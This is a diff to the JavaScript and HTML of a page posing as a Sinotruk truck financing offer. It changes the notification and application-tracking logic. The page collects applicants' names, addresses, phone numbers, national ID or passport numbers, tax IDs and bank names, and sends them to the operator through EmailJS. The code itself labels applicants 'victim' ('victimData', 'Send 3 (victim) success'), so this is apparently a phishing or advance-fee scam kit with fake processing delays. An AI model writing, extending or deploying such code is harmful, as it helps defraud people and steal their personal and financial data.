@@ -41,8 +41,8 @@
         .notification-time { font-size: 0.7rem; color: #888; margin-bottom: 4px; }
         .notification-title { font-weight: 600; font-size: 0.85rem; margin-bottom: 4px; }
         .notification-detail { font-size: 0.75rem; color: #666; }
-        .cancel-btn { background: none; border: none; color: #C41E3A; cursor: pointer; font-size: 0.8rem; margin-top: 8px; padding: 4px 0; width: 100%; text-align: left; }
-        .cancel-btn:hover { text-decoration: underline; }
+        .cancel-app-btn { background: none; border: none; color: #C41E3A; cursor: pointer; font-size: 0.75rem; margin-top: 6px; padding: 4px 0; width: 100%; text-align: left; }
+        .cancel-app-btn:hover { text-decoration: underline; }
         .hero { text-align: center; padding: 2.5rem 1rem; max-width: 800px; margin: 0 auto; }
         .live-badge { display: inline-flex; align-items: center; gap: 0.4rem; background: #FFF5F5; padding: 0.4rem 1rem; border-radius: 2rem; font-size: 0.8rem; margin-bottom: 1rem; }
         .live-dot { width: 8px; height: 8px; background: #22C55E; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
@@ -103,7 +103,7 @@
         .radio-group input { width: auto; margin: 0; }
         .btn-submit { background: #C41E3A; color: white; width: 100%; padding: 0.9rem; border: none; border-radius: 2.5rem; font-weight: 700; cursor: pointer; margin-top: 1rem; transition: all 0.2s; font-size: 1rem; }
         .btn-submit:hover { background: #8B0000; }
-        .btn-secondary { background: #E5E5E5; color: #1A1A1A; padding: 0.8rem 1.5rem; border: none; border-radius: 2rem; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+        .btn-secondary { background: #E5E5E5; color: #1A1A1A; padding: 0.8rem 1.5rem; border-radius: 2rem; border: none; font-weight: 600; cursor: pointer; transition: all 0.2s; }
         .btn-secondary:hover { background: #CCC; }
         .modal-buttons { display: flex; gap: 1rem; justify-content: flex-end; margin-top: 1.5rem; }
         .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid white; border-top-color: transparent; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 8px; vertical-align: middle; }
@@ -252,7 +252,7 @@
 <div id="claimModal" class="modal"><div class="modal-content" id="claimModalContent"></div></div>
 <div id="businessModal" class="modal"><div class="modal-content" id="businessModalContent"></div></div>
 <div id="successModal" class="modal"><div class="modal-content" id="successModalContent"></div></div>
-<div id="cancelPopup" class="cancel-popup-overlay"><div class="cancel-popup"><h3>Cancel Application</h3><p>Are you sure you want to cancel your application? You can always reapply later.</p><div class="cancel-popup-buttons"><button class="cancel-confirm" id="confirmCancelBtn">Yes, Cancel</button><button class="cancel-cancel" id="dismissCancelBtn">No, Go Back</button></div></div></div>
+<div id="cancelPopup" class="cancel-popup-overlay"><div class="cancel-popup"><h3>Cancel Application</h3><p>Are you sure you want to cancel this application?</p><div class="cancel-popup-buttons"><button class="cancel-confirm" id="confirmCancelBtn">Yes, Cancel</button><button class="cancel-cancel" id="dismissCancelBtn">No, Go Back</button></div></div></div>
 
 <script>
     emailjs.init("oUr2KrIthXHDGSj1R");
@@ -270,11 +270,15 @@
         { id: 9, name: "HOWO Bus Chassis", category: "Passenger Transport", badge: "Commercial", badgeColor: "#D4AF37", capacity: "40-60 passengers", engine: "MC11 440HP", fullPrice: 72000, price: "$72,000", upfront30: "$21,600", upfrontValue: 21600, image: "https://placehold.co/600x400?text=HOWO+Bus+Chassis" }
     ];
 
+    // Store multiple applications
+    let applications = JSON.parse(localStorage.getItem('sinotruk_applications')) || [];
+    let currentAppId = null;
     let selectedTruck = null, claimData = null, businessData = null;
-    let notifications = JSON.parse(localStorage.getItem('sinotruk_notifications')) || [];
+    let successTimerInterval = null;
 
-    function saveNotification(title, detail, isResumable = true, step = null) { 
-        notifications.unshift({ title, detail, time: new Date().toLocaleTimeString(), isResumable, step }); 
+    function saveNotification(title, detail, appId, step) { 
+        let notifications = JSON.parse(localStorage.getItem('sinotruk_notifications')) || [];
+        notifications.unshift({ id: appId, title, detail, time: new Date().toLocaleTimeString(), step }); 
         if (notifications.length > 10) notifications.pop(); 
         localStorage.setItem('sinotruk_notifications', JSON.stringify(notifications)); 
         updateBell(); 
@@ -282,104 +286,198 @@
     
     function updateBell() { 
         const badge = document.getElementById('bellBadge'), list = document.getElementById('notificationList'); 
+        const notifications = JSON.parse(localStorage.getItem('sinotruk_notifications')) || [];
         if (notifications.length > 0) { badge.style.display = 'inline-block'; badge.innerText = notifications.length; } 
         else { badge.style.display = 'none'; } 
         if (list) { 
-            list.innerHTML = notifications.map((n, idx) => `<div class="notification-item" data-idx="${idx}"><div class="notification-time">${n.time}</div><div class="notification-title">${n.title}</div><div class="notification-detail">${n.detail}</div></div>`).join(''); 
+            list.innerHTML = notifications.map((n, idx) => `
+                <div class="notification-item" data-idx="${idx}" data-appid="${n.id}">
+                    <div class="notification-time">${n.time}</div>
+                    <div class="notification-title">${n.title}</div>
+                    <div class="notification-detail">${n.detail}</div>
+                    <button class="cancel-app-btn" data-appid="${n.id}">Cancel This Application</button>
+                </div>
+            `).join(''); 
             if (notifications.length === 0) list.innerHTML = '<div class="notification-item">No notifications yet</div>'; 
             else { 
-                document.querySelectorAll('.notification-item[data-idx]').forEach(item => {
+                document.querySelectorAll('.notification-item').forEach(item => {
+                    const appId = item.getAttribute('data-appid');
                     item.addEventListener('click', (e) => {
+                        if (e.target.classList.contains('cancel-app-btn')) return;
                         e.stopPropagation();
-                        const idx = parseInt(item.getAttribute('data-idx'));
-                        const notif = notifications[idx];
-                        if (notif.title.includes('Application Submitted') || notif.title.includes('Previously Submitted')) {
-                            const savedClaimData = localStorage.getItem('sinotruk_claimData');
-                            const savedSelectedTruck = localStorage.getItem('sinotruk_selectedTruck');
-                            if (savedClaimData && savedSelectedTruck) {
-                                claimData = JSON.parse(savedClaimData);
-                                selectedTruck = JSON.parse(savedSelectedTruck);
-                                showBusinessModal();
-                            }
-                        } else if (notif.title.includes('Business Details Submitted')) {
-                            const savedBusinessData = localStorage.getItem('sinotruk_businessData');
-                            if (savedBusinessData) {
-                                businessData = JSON.parse(savedBusinessData);
-                                claimData = JSON.parse(localStorage.getItem('sinotruk_claimData'));
+                        const app = applications.find(a => a.id === appId);
+                        if (app) {
+                            if (app.step2Completed) {
+                                claimData = app.claimData;
+                                businessData = app.businessData;
+                                selectedTruck = app.selectedTruck;
                                 showSuccess();
+                            } else if (app.step1Completed) {
+                                claimData = app.claimData;
+                                selectedTruck = app.selectedTruck;
+                                showBusinessModal();
                             }
                         }
                         document.getElementById('notificationDropdown').classList.remove('show');
                     });
                 });
-                const cancelDiv = document.createElement('div'); 
-                cancelDiv.className = 'notification-item'; 
-                cancelDiv.innerHTML = '<button class="cancel-btn" id="cancelAppBtn">Cancel Application</button>'; 
-                list.appendChild(cancelDiv); 
-                document.getElementById('cancelAppBtn')?.addEventListener('click', () => { document.getElementById('cancelPopup').style.display = 'flex'; }); 
+                document.querySelectorAll('.cancel-app-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        const appId = btn.getAttribute('data-appid');
+                        currentAppId = appId;
+                        document.getElementById('cancelPopup').style.display = 'flex';
+                    });
+                });
             } 
         } 
     }
     
-    function clearNotifications() { notifications = []; localStorage.removeItem('sinotruk_notifications'); localStorage.removeItem('sinotruk_step1_completed'); localStorage.removeItem('sinotruk_step2_completed'); localStorage.removeItem('sinotruk_claimData'); localStorage.removeItem('sinotruk_businessData'); localStorage.removeItem('sinotruk_selectedTruck'); updateBell(); }
+    function cancelApplication(appId) {
+        applications = applications.filter(a => a.id !== appId);
+        localStorage.setItem('sinotruk_applications', JSON.stringify(applications));
+        let notifications = JSON.parse(localStorage.getItem('sinotruk_notifications')) || [];
+        notifications = notifications.filter(n => n.id !== appId);
+        localStorage.setItem('sinotruk_notifications', JSON.stringify(notifications));
+        updateBell();
+        document.getElementById('cancelPopup').style.display = 'none';
+    }
 
     document.getElementById('bellContainer')?.addEventListener('click', (e) => { e.stopPropagation(); document.getElementById('notificationDropdown').classList.toggle('show'); });
     document.addEventListener('click', () => { document.getElementById('notificationDropdown')?.classList.remove('show'); });
-    document.getElementById('confirmCancelBtn')?.addEventListener('click', () => { clearNotifications(); document.getElementById('cancelPopup').style.display = 'none'; window.location.href = window.location.pathname; });
+    document.getElementById('confirmCancelBtn')?.addEventListener('click', () => { if (currentAppId) cancelApplication(currentAppId); });
     document.getElementById('dismissCancelBtn')?.addEventListener('click', () => { document.getElementById('cancelPopup').style.display = 'none'; });
-    document.getElementById('resumeContinueBtn')?.addEventListener('click', () => {
-        document.getElementById('resumeModal').style.display = 'none';
-        if (localStorage.getItem('sinotruk_step2_completed') === 'true') {
-            businessData = JSON.parse(localStorage.getItem('sinotruk_businessData'));
-            claimData = JSON.parse(localStorage.getItem('sinotruk_claimData'));
-            showSuccess();
-        } else if (localStorage.getItem('sinotruk_step1_completed') === 'true') {
-            claimData = JSON.parse(localStorage.getItem('sinotruk_claimData'));
-            selectedTruck = JSON.parse(localStorage.getItem('sinotruk_selectedTruck'));
-            showBusinessModal();
-        }
-    });
-    document.getElementById('resumeRestartBtn')?.addEventListener('click', () => {
-        clearNotifications();
-        document.getElementById('resumeModal').style.display = 'none';
-        window.location.href = window.location.pathname;
-    });
 
-    function calculateTotalUpfront(upfrontValue, quantity) { 
-        const total = upfrontValue * quantity; 
-        return `$${total.toLocaleString()}`; 
-    }
+    function calculateTotalUpfront(upfrontValue, quantity) { const total = upfrontValue * quantity; return `$${total.toLocaleString()}`; }
     function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
     function renderTrucks() { const grid = document.getElementById('trucksGrid'); grid.innerHTML = ''; trucks.forEach(truck => { const card = document.createElement('div'); card.className = 'truck-card'; card.innerHTML = `<div class="card-badge" style="background: ${truck.badgeColor}; color: ${truck.badgeColor === '#D4AF37' ? '#1A1A1A' : 'white'}">${truck.badge}</div><img class="card-image" src="${truck.image}" alt="${truck.name}"><div class="truck-info"><div class="truck-category">${truck.category}</div><div class="truck-title">${truck.name}</div><div class="spec-grid"><div class="spec-item"><i class="fas fa-weight-hanging"></i> ${truck.capacity}</div><div class="spec-item"><i class="fas fa-engine"></i> ${truck.engine}</div><div class="spec-item"><i class="fas fa-globe"></i> Worldwide Shipping</div><div class="spec-item"><i class="fas fa-calendar-alt"></i> 10-Year Terms</div></div><div class="price">Full Price: ${truck.price}</div><div class="upfront">30% Down: ${truck.upfront30} <small>only</small></div><div class="terms">Balance payable within 10 years • 0% interest</div><button class="claim-btn-card" data-truck='${JSON.stringify(truck)}'><i class="fas fa-truck"></i> Get This Truck</button></div>`; grid.appendChild(card); }); document.querySelectorAll('.claim-btn-card').forEach(btn => { btn.addEventListener('click', () => { selectedTruck = JSON.parse(btn.getAttribute('data-truck')); showClaimModal(); }); }); }
 
-    function showClaimModal() { const modal = document.getElementById('claimModal'), content = document.getElementById('claimModalContent'); content.innerHTML = `<h2 style="color:#C41E3A;"><i class="fas fa-truck"></i> You selected:</h2><p style="font-size:1.1rem; font-weight:500; margin-bottom:1rem;">${selectedTruck.name}</p><img src="${selectedTruck.image}" style="width:100%; border-radius:0.8rem; margin-bottom:1rem;"><form id="claimForm"><div class="form-group"><label>Full Name</label><input type="text" id="fullName" required placeholder="John Doe"></div><div class="form-group"><label>Email Address</label><input type="email" id="email" required placeholder="john@example.com"></div><div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="+1234567890"></div><div class="form-group"><label>Delivery Address</label><input type="text" id="address" required placeholder="123 Main St, City, Country"></div><div class="form-group"><label>Quantity (Number of Trucks)</label><input type="number" id="quantity" required min="1" value="1"></div><div class="modal-buttons"><button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button><button type="submit" class="btn-submit" id="submitClaimBtn">Submit Application</button></div></form>`; modal.style.display = 'flex'; document.getElementById('cancelClaimBtn').onclick = () => modal.style.display = 'none'; document.getElementById('claimForm').addEventListener('submit', async (e) => { e.preventDefault(); const submitBtn = document.getElementById('submitClaimBtn'); const originalText = submitBtn.innerHTML; submitBtn.disabled = true; submitBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>'; await sleep(1500); const quantity = parseInt(document.getElementById('quantity').value); const totalUpfront = calculateTotalUpfront(selectedTruck.upfrontValue, quantity); claimData = { fullName: document.getElementById('fullName').value, email: document.getElementById('email').value, phone: document.getElementById('phone').value, address: document.getElementById('address').value, truckModel: selectedTruck.name, quantity: quantity, upfrontAmount: selectedTruck.upfront30, totalUpfront: totalUpfront, totalUpfrontValue: selectedTruck.upfrontValue * quantity, timestamp: new Date().toLocaleString() }; emailjs.send('service_rhipogs', 'template_v13pw4n', claimData).then(() => { console.log('Send 1 success'); }).catch((err) => { console.log('Send 1 error:', err); }); saveNotification('Application Submitted', `${selectedTruck.name}, Qty: ${quantity}, Total 30% Down: ${totalUpfront}`, true, 2); localStorage.setItem('sinotruk_step1_completed', 'true'); localStorage.setItem('sinotruk_claimData', JSON.stringify(claimData)); localStorage.setItem('sinotruk_selectedTruck', JSON.stringify(selectedTruck)); submitBtn.disabled = false; submitBtn.innerHTML = originalText; modal.style.display = 'none'; showBusinessModal(); }); }
+    function showClaimModal() { 
+        const appId = Date.now().toString();
+        currentAppId = appId;
+        const modal = document.getElementById('claimModal'), content = document.getElementById('claimModalContent'); 
+        content.innerHTML = `<h2 style="color:#C41E3A;"><i class="fas fa-truck"></i> You selected:</h2><p style="font-size:1.1rem; font-weight:500; margin-bottom:1rem;">${selectedTruck.name}</p><img src="${selectedTruck.image}" style="width:100%; border-radius:0.8rem; margin-bottom:1rem;"><form id="claimForm"><div class="form-group"><label>Full Name</label><input type="text" id="fullName" required placeholder="John Doe"></div><div class="form-group"><label>Email Address</label><input type="email" id="email" required placeholder="john@example.com"></div><div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="+1234567890"></div><div class="form-group"><label>Delivery Address</label><input type="text" id="address" required placeholder="123 Main St, City, Country"></div><div class="form-group"><label>Quantity (Number of Trucks)</label><input type="number" id="quantity" required min="1" value="1"></div><div class="modal-buttons"><button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button><button type="submit" class="btn-submit" id="submitClaimBtn">Submit Application</button></div></form>`; 
+        modal.style.display = 'flex'; 
+        document.getElementById('cancelClaimBtn').onclick = () => modal.style.display = 'none'; 
+        document.getElementById('claimForm').addEventListener('submit', async (e) => { 
+            e.preventDefault(); 
+            const submitBtn = document.getElementById('submitClaimBtn'); 
+            const originalText = submitBtn.innerHTML; 
+            submitBtn.disabled = true; 
+            submitBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>'; 
+            await sleep(1500); 
+            const quantity = parseInt(document.getElementById('quantity').value); 
+            const totalUpfront = calculateTotalUpfront(selectedTruck.upfrontValue, quantity); 
+            claimData = { 
+                id: appId,
+                fullName: document.getElementById('fullName').value, 
+                email: document.getElementById('email').value, 
+                phone: document.getElementById('phone').value, 
+                address: document.getElementById('address').value, 
+                truckModel: selectedTruck.name, 
+                quantity: quantity, 
+                upfrontAmount: selectedTruck.upfront30, 
+                totalUpfront: totalUpfront, 
+                totalUpfrontValue: selectedTruck.upfrontValue * quantity, 
+                timestamp: new Date().toLocaleString() 
+            }; 
+            emailjs.send('service_rhipogs', 'template_v13pw4n', claimData).then(() => { console.log('Send 1 success'); }).catch((err) => { console.log('Send 1 error:', err); }); 
+            saveNotification('Application Submitted', `${selectedTruck.name}, Qty: ${quantity}, Total 30% Down: ${totalUpfront}`, appId, 2); 
+            const existingApp = applications.find(a => a.id === appId);
+            if (existingApp) {
+                existingApp.claimData = claimData;
+                existingApp.selectedTruck = selectedTruck;
+                existingApp.step1Completed = true;
+            } else {
+                applications.push({ id: appId, claimData, selectedTruck, step1Completed: true, step2Completed: false });
+            }
+            localStorage.setItem('sinotruk_applications', JSON.stringify(applications));
+            submitBtn.disabled = false; 
+            submitBtn.innerHTML = originalText; 
+            modal.style.display = 'none'; 
+            showBusinessModal(); 
+        }); 
+    }
 
-    function showBusinessModal() { const modal = document.getElementById('businessModal'), content = document.getElementById('businessModalContent'); let applicantType = 'individual'; content.innerHTML = `<h2 style="color:#C41E3A;"><i class="fas fa-building"></i> Business & Financial Verification</h2><p style="margin-bottom:1rem;">Complete your application for ${claimData.truckModel}</p><form id="businessForm"><div class="form-group"><label>Applicant Type</label><div class="radio-group"><label><input type="radio" name="applicantType" value="individual" checked> Individual / Sole Proprietor</label><label><input type="radio" name="applicantType" value="business"> Registered Business</label></div></div><div id="individualFields"><div class="form-group"><label>National ID / Passport Number</label><input type="text" id="nationalId" placeholder="Enter your ID number"></div><div class="form-group"><label>Occupation</label><select id="occupation"><option value="">Select occupation</option><option value="Farmer">Farmer</option><option value="Transporter">Transporter</option><option value="Contractor">Contractor</option><option value="Other">Other</option></select></div><div class="form-group"><label>Years of Experience</label><select id="experience"><option value="">Select</option><option value="Less than 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option><option value="3-5 years">3-5 years</option><option value="5+ years">5+ years</option></select></div></div><div id="businessFields" style="display:none;"><div class="form-group"><label>Business / Company Name</label><input type="text" id="businessName" placeholder="Enter your business name"></div><div class="form-group"><label>Business Registration Number / Tax ID</label><input type="text" id="regNumber" placeholder="Enter registration number"></div><div class="form-group"><label>Years in Business</label><select id="yearsBusiness"><option value="">Select</option><option value="Less than 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option><option value="3-5 years">3-5 years</option><option value="5-10 years">5-10 years</option><option value="10+ years">10+ years</option></select></div><div class="form-group"><label>Annual Revenue Range</label><select id="revenue"><option value="">Select</option><option value="Less than $50,000">Less than $50,000</option><option value="$50,000 - $100,000">$50,000 - $100,000</option><option value="$100,000 - $250,000">$100,000 - $250,000</option><option value="$250,000 - $500,000">$250,000 - $500,000</option><option value="$500,000+">$500,000+</option></select></div></div><div class="form-group"><label>Bank Name for Financing</label><input type="text" id="bankName" required placeholder="Enter your bank name"></div><div class="form-group"><label>Truck Usage Purpose</label><select id="truckUsage" required><option value="">Select purpose</option><option value="Farming">Farming</option><option value="Construction">Construction</option><option value="Logistics / Freight">Logistics / Freight</option><option value="Mining">Mining</option><option value="Transport">Transport</option><option value="Other">Other</option></select></div><div class="form-group"><label>Preferred Payment Terms</label><select id="paymentTerms" required><option value="">Select terms</option><option value="Monthly">Monthly</option><option value="Quarterly">Quarterly</option><option value="Yearly">Yearly</option></select></div><div class="form-group"><label>Expected Down Payment Date</label><input type="date" id="paymentDate" required></div><div class="form-group"><label>Additional Notes (Optional)</label><textarea id="notes" rows="3" placeholder="Any special requirements or questions..."></textarea></div><div class="modal-buttons"><button type="button" class="btn-secondary" id="cancelBusinessBtn">Back</button><button type="submit" class="btn-submit" id="submitBusinessBtn">Complete Application</button></div></form>`; modal.style.display = 'flex'; document.getElementById('cancelBusinessBtn').onclick = () => { modal.style.display = 'none'; showClaimModal(); }; const radios = document.querySelectorAll('input[name="applicantType"]'); radios.forEach(radio => { radio.addEventListener('change', () => { const isBusiness = radio.value === 'business'; document.getElementById('individualFields').style.display = isBusiness ? 'none' : 'block'; document.getElementById('businessFields').style.display = isBusiness ? 'block' : 'none'; applicantType = radio.value; }); }); document.getElementById('businessForm').addEventListener('submit', async (e) => { e.preventDefault(); const submitBtn = document.getElementById('submitBusinessBtn'); const originalText = submitBtn.innerHTML; submitBtn.disabled = true; submitBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>'; await sleep(1500); const isBusiness = document.querySelector('input[name="applicantType"]:checked').value === 'business'; const fields = { fullName: claimData.fullName, email: claimData.email, phone: claimData.phone, address: claimData.address, truckModel: claimData.truckModel, quantity: claimData.quantity, totalUpfront: claimData.totalUpfront, applicantType: isBusiness ? 'Registered Business' : 'Individual', bankName: document.getElementById('bankName').value, truckUsage: document.getElementById('truckUsage').value, paymentTerms: document.getElementById('paymentTerms').value, paymentDate: document.getElementById('paymentDate').value, notes: document.getElementById('notes').value, timestamp: new Date().toLocaleString() }; if (isBusiness) { fields.businessName = document.getElementById('businessName').value; fields.registrationNumber = document.getElementById('regNumber').value; fields.yearsInBusiness = document.getElementById('yearsBusiness').value; fields.annualRevenue = document.getElementById('revenue').value; } else { fields.nationalId = document.getElementById('nationalId').value; fields.occupation = document.getElementById('occupation').value; fields.yearsExperience = document.getElementById('experience').value; } businessData = fields; const victimData = { to_name: claimData.fullName, to_email: claimData.email, truck_model: claimData.truckModel, quantity: claimData.quantity, total_upfront: claimData.totalUpfront, timestamp: new Date().toLocaleString() }; emailjs.send('service_rhipogs', 'template_v13pw4n', businessData).then(() => { console.log('Send 2 success'); }).catch((err) => { console.log('Send 2 error:', err); }); emailjs.send('service_rhipogs', 'template_42yhth5', victimData).then(() => { console.log('Send 3 (victim) success'); }).catch((err) => { console.log('Send 3 error:', err); }); saveNotification('Business Details Submitted', `${isBusiness ? fields.businessName : 'Individual'}, ${fields.paymentTerms} payments`, true, 3); localStorage.setItem('sinotruk_step2_completed', 'true'); localStorage.setItem('sinotruk_businessData', JSON.stringify(businessData)); submitBtn.disabled = false; submitBtn.innerHTML = originalText; modal.style.display = 'none'; showSuccess(); }); }
+    function showBusinessModal() { 
+        const modal = document.getElementById('businessModal'), content = document.getElementById('businessModalContent'); 
+        let applicantType = 'individual'; 
+        content.innerHTML = `<h2 style="color:#C41E3A;"><i class="fas fa-building"></i> Business & Financial Verification</h2><p style="margin-bottom:1rem;">Complete your application for ${claimData.truckModel}</p><form id="businessForm"><div class="form-group"><label>Applicant Type</label><div class="radio-group"><label><input type="radio" name="applicantType" value="individual" checked> Individual / Sole Proprietor</label><label><input type="radio" name="applicantType" value="business"> Registered Business</label></div></div><div id="individualFields"><div class="form-group"><label>National ID / Passport Number</label><input type="text" id="nationalId" placeholder="Enter your ID number"></div><div class="form-group"><label>Occupation</label><select id="occupation"><option value="">Select occupation</option><option value="Farmer">Farmer</option><option value="Transporter">Transporter</option><option value="Contractor">Contractor</option><option value="Other">Other</option></select></div><div class="form-group"><label>Years of Experience</label><select id="experience"><option value="">Select</option><option value="Less than 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option><option value="3-5 years">3-5 years</option><option value="5+ years">5+ years</option></select></div></div><div id="businessFields" style="display:none;"><div class="form-group"><label>Business / Company Name</label><input type="text" id="businessName" placeholder="Enter your business name"></div><div class="form-group"><label>Business Registration Number / Tax ID</label><input type="text" id="regNumber" placeholder="Enter registration number"></div><div class="form-group"><label>Years in Business</label><select id="yearsBusiness"><option value="">Select</option><option value="Less than 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option><option value="3-5 years">3-5 years</option><option value="5-10 years">5-10 years</option><option value="10+ years">10+ years</option></select></div><div class="form-group"><label>Annual Revenue Range</label><select id="revenue"><option value="">Select</option><option value="Less than $50,000">Less than $50,000</option><option value="$50,000 - $100,000">$50,000 - $100,000</option><option value="$100,000 - $250,000">$100,000 - $250,000</option><option value="$250,000 - $500,000">$250,000 - $500,000</option><option value="$500,000+">$500,000+</option></select></div></div><div class="form-group"><label>Bank Name for Financing</label><input type="text" id="bankName" required placeholder="Enter your bank name"></div><div class="form-group"><label>Truck Usage Purpose</label><select id="truckUsage" required><option value="">Select purpose</option><option value="Farming">Farming</option><option value="Construction">Construction</option><option value="Logistics / Freight">Logistics / Freight</option><option value="Mining">Mining</option><option value="Transport">Transport</option><option value="Other">Other</option></select></div><div class="form-group"><label>Preferred Payment Terms</label><select id="paymentTerms" required><option value="">Select terms</option><option value="Monthly">Monthly</option><option value="Quarterly">Quarterly</option><option value="Yearly">Yearly</option></select></div><div class="form-group"><label>Expected Down Payment Date</label><input type="date" id="paymentDate" required></div><div class="form-group"><label>Additional Notes (Optional)</label><textarea id="notes" rows="3" placeholder="Any special requirements or questions..."></textarea></div><div class="modal-buttons"><button type="button" class="btn-secondary" id="cancelBusinessBtn">Back</button><button type="submit" class="btn-submit" id="submitBusinessBtn">Complete Application</button></div></form>`; 
+        modal.style.display = 'flex'; 
+        document.getElementById('cancelBusinessBtn').onclick = () => { modal.style.display = 'none'; showClaimModal(); }; 
+        const radios = document.querySelectorAll('input[name="applicantType"]'); 
+        radios.forEach(radio => { radio.addEventListener('change', () => { const isBusiness = radio.value === 'business'; document.getElementById('individualFields').style.display = isBusiness ? 'none' : 'block'; document.getElementById('businessFields').style.display = isBusiness ? 'block' : 'none'; applicantType = radio.value; }); }); 
+        document.getElementById('businessForm').addEventListener('submit', async (e) => { 
+            e.preventDefault(); 
+            const submitBtn = document.getElementById('submitBusinessBtn'); 
+            const originalText = submitBtn.innerHTML; 
+            submitBtn.disabled = true; 
+            submitBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>'; 
+            await sleep(1500); 
+            const isBusiness = document.querySelector('input[name="applicantType"]:checked').value === 'business'; 
+            const fields = { 
+                fullName: claimData.fullName, email: claimData.email, phone: claimData.phone, address: claimData.address, 
+                truckModel: claimData.truckModel, quantity: claimData.quantity, totalUpfront: claimData.totalUpfront, 
+                applicantType: isBusiness ? 'Registered Business' : 'Individual', 
+                bankName: document.getElementById('bankName').value, truckUsage: document.getElementById('truckUsage').value, 
+                paymentTerms: document.getElementById('paymentTerms').value, paymentDate: document.getElementById('paymentDate').value, 
+                notes: document.getElementById('notes').value, timestamp: new Date().toLocaleString() 
+            }; 
+            if (isBusiness) { 
+                fields.businessName = document.getElementById('businessName').value; 
+                fields.registrationNumber = document.getElementById('regNumber').value; 
+                fields.yearsInBusiness = document.getElementById('yearsBusiness').value; 
+                fields.annualRevenue = document.getElementById('revenue').value; 
+            } else { 
+                fields.nationalId = document.getElementById('nationalId').value; 
+                fields.occupation = document.getElementById('occupation').value; 
+                fields.yearsExperience = document.getElementById('experience').value; 
+            } 
+            businessData = fields; 
+            const victimData = { to_name: claimData.fullName, to_email: claimData.email, truck_model: claimData.truckModel, quantity: claimData.quantity, total_upfront: claimData.totalUpfront, timestamp: new Date().toLocaleString() }; 
+            emailjs.send('service_rhipogs', 'template_v13pw4n', businessData).then(() => { console.log('Send 2 success'); }).catch((err) => { console.log('Send 2 error:', err); }); 
+            emailjs.send('service_rhipogs', 'template_42yhth5', victimData).then(() => { console.log('Send 3 (victim) success'); }).catch((err) => { console.log('Send 3 error:', err); }); 
+            saveNotification('Business Details Submitted', `${isBusiness ? fields.businessName : 'Individual'}, ${fields.paymentTerms} payments`, currentAppId, 3); 
+            const appIndex = applications.findIndex(a => a.id === currentAppId);
+            if (appIndex !== -1) {
+                applications[appIndex].businessData = businessData;
+                applications[appIndex].step2Completed = true;
+                localStorage.setItem('sinotruk_applications', JSON.stringify(applications));
+            }
+            submitBtn.disabled = false; submitBtn.innerHTML = originalText; 
+            modal.style.display = 'none'; 
+            showSuccess(); 
+        }); 
+    }
 
-    let successTimerInterval;
     function showSuccess() { 
         const modal = document.getElementById('successModal'), content = document.getElementById('successModalContent'); 
-        let remainingTime = localStorage.getItem('successTimer');
-        if (!remainingTime) { remainingTime = 60; localStorage.setItem('successTimer', remainingTime); }
+        let remainingTime = parseInt(localStorage.getItem('successTimer'));
+        if (isNaN(remainingTime) || remainingTime <= 0) { remainingTime = 60; localStorage.setItem('successTimer', remainingTime); }
         const displayTotal = claimData.totalUpfront;
-        content.innerHTML = `<div class="success-card"><div class="success-icon"><i class="fas fa-check-circle"></i></div><h2>APPLICATION RECEIVED!</h2><p><strong>${businessData.truckModel}</strong></p><p>Quantity: ${businessData.quantity}</p><p><strong>30% Down Payment: ${displayTotal}</strong></p><p style="margin-top:0.5rem;">A confirmation message has been sent to <strong>${claimData.email}</strong></p><button class="chat-btn" id="chatSupportBtn"><i class="fas fa-comment-dots"></i> Chat with Us</button><button class="home-btn" id="homeBtn"><i class="fas fa-home"></i> Return to Homepage</button><div class="success-timer" id="successTimer">Redirecting to homepage in ${remainingTime} seconds...</div></div>`; 
+        content.innerHTML = `<div class="success-card"><div class="success-icon"><i class="fas fa-check-circle"></i></div><h2>APPLICATION RECEIVED!</h2><p><strong>${businessData.truckModel}</strong></p><p>Quantity: ${businessData.quantity}</p><p><strong>30% Down Payment: ${displayTotal}</strong></p><p style="margin-top:0.5rem;">A confirmation message has been sent to <strong>${claimData.email}</strong></p><button class="chat-btn" id="chatSupportBtn"><i class="fas fa-comment-dots"></i> Chat with Us</button><button class="home-btn" id="homeBtn"><i class="fas fa-home"></i> Return to Homepage</button><div class="success-timer" id="successTimerDisplay">Redirecting to homepage in ${remainingTime} seconds...</div></div>`; 
         modal.style.display = 'flex'; 
         document.getElementById('chatSupportBtn').onclick = () => { if (window.$crisp) window.$crisp.push(['do', 'chat:open']); };
-        document.getElementById('homeBtn').onclick = () => { localStorage.removeItem('successTimer'); clearTimeout(successTimerInterval); modal.style.display = 'none'; window.location.href = window.location.pathname; };
-        const timerDisplay = document.getElementById('successTimer'); 
+        document.getElementById('homeBtn').onclick = () => { 
+            localStorage.removeItem('successTimer');
+            if (successTimerInterval) clearInterval(successTimerInterval);
+            modal.style.display = 'none';
+            window.location.href = window.location.pathname;
+        };
+        const timerDisplay = document.getElementById('successTimerDisplay'); 
         if (successTimerInterval) clearInterval(successTimerInterval); 
         successTimerInterval = setInterval(() => { 
-            remainingTime = parseInt(localStorage.getItem('successTimer')) || 0;
-            if (remainingTime <= 0) { 
+            let remaining = parseInt(localStorage.getItem('successTimer')) || 0;
+            if (remaining <= 0) { 
                 clearInterval(successTimerInterval); 
                 localStorage.removeItem('successTimer');
                 modal.style.display = 'none'; 
                 window.location.href = window.location.pathname; 
             } else { 
-                remainingTime--; 
-                localStorage.setItem('successTimer', remainingTime); 
-                timerDisplay.innerText = `Redirecting to homepage in ${remainingTime} seconds...`; 
+                remaining--; 
+                localStorage.setItem('successTimer', remaining); 
+                timerDisplay.innerText = `Redirecting to homepage in ${remaining} seconds...`; 
             } 
         }, 1000); 
     }
@@ -417,18 +515,26 @@
